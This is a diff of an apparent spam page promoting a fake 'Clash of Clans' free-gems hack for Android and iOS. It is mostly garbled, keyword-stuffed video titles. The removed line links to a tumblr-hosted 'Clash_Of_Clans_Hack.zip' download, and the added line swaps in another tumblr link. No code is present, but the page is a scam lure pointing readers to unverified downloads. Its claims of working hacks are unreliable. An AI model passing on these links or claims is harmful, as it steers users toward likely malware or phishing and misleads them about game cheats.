@@ -2,9 +2,9 @@
 
 How to Hack Clash of Clans Free Android and iOS  How to hack clash of clans 2017-Clash of clans hack 2017-Hack Clash of clans iOs Android  COC CLASH OF CLANS unlimited GEMS HACK 2017 GIVEAWAY GEMS without ROOT APK BIG ROASTER new link  des  Clash Of Clans Free Gems - Hack For COC! (iOS and Android)
 
-[![N|Solid](http://i.imgur.com/uLMo66l.png)](https://jeuxforums.tumblr.com/?file=Clash_Of_Clans_Hack.zip)
+[![N|Solid](http://i.imgur.com/uLMo66l.png)](https://clashofclansgems2019.tumblr.com/)
 
-Clash of Clans Hack - Clash of Clans Free Gems Hack - Android & iOS  ×300 Archer Tower Vs ×1000 Max Ballons | COC Private Server | Clash Of Clans Hack / Glitch  2017                 clash of clans hack¿ GAME PLAY  The Truth Behind Hack Clash of Clans (COC) Videos (Hindi-हिन्दी )  Clash Of clans Hack - Free Gems [ android & ios ]  Clash Of Clans Hack - Free Gems / Gold Hack 2018 - iOS & Android                   Clash of Clans Hack Clash of Clans Free Hack - 
+Clash Of Clans Hack / Glitch  2017                 clash of clans hack¿ GAME PLAY  The Truth Behind Hack Clash of Clans (COC) Videos (Hindi-हिन्दी )  Clash Of clans Hack - Free Gems [ android & ios ]  Clash Of Clans Hack - Free Gems / Gold Hack 2018 - iOS & Android                   Clash of Clans Hack Clash of Clans Free Hack -  Clash of Clans Hack - Clash of Clans Free Gems Hack - Android & iOS  ×300 Archer Tower Vs ×1000 Max Ballons | COC Private Server | 
 
 Clash of Clans bogus gem hack claims endure 
 
